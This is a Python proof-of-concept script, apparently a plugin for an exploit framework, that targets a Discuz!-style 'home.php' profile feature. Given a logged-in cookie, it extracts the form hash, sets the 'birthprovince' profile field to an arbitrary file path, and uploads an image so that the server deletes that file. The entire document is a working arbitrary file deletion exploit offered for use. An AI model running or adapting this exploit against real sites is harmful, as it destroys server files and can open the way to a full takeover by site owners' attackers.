from lib.core.data import target
import requests
import re
import os
import urlparse


def poc():
    try:
        # correct the url
        if not target.url.endswith("home.php"):
            print("[*] Please make sure the url end with 'home.php'")
            exit()
        # get the cookie
        cookie = raw_input("[*] Please paste the cookie:").split(';')
        cookies = {}
        for i in range(0, len(cookie)):
            name, value = cookie[i].strip().split('=', 1)
            cookies[name] = value
        loginurl = target.url + '?mod=spacecp'
        text = requests.get(target.url, cookies=cookies).text
        # print(text)
        # print(cookies)

        # get the target file
        targetfile = raw_input("[*] Please input the target file:")

        # text = 'logging&amp;action=logout&amp;formhash=b5daabe7"></a>'

        # get the formhash
        reformhash = 'formhash=.*?"'
        patternformhash = re.compile(reformhash)
        formhash = patternformhash.search(text).group()[9:-1]
        print("[*] Get the formhash : " + formhash)

        # set birthprovince
        birthprovinceurl = target.url + '?mod=spacecp&ac=profile'
        birthprovincedata = {
            "birthprovince": targetfile,
            "profilesubmit": "1",
            "formhash": formhash
        }
        requests.post(birthprovinceurl, cookies=cookies, data=birthprovincedata)

        # upload a picture and delete the target file
        uploadurl = target.url + '?mod=spacecp&ac=profile&op=base'
        files = {'birthprovince': ("pic.png", open('plugin/resource/picture/1.png', 'rb'))}
        data = {
            'formhash': formhash,
            'profilesubmit': '1'
        }

        requests.post(uploadurl, cookies=cookies, data=data, files=files)
        print("[*] Deleting the file.")

    except KeyError as e:
        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
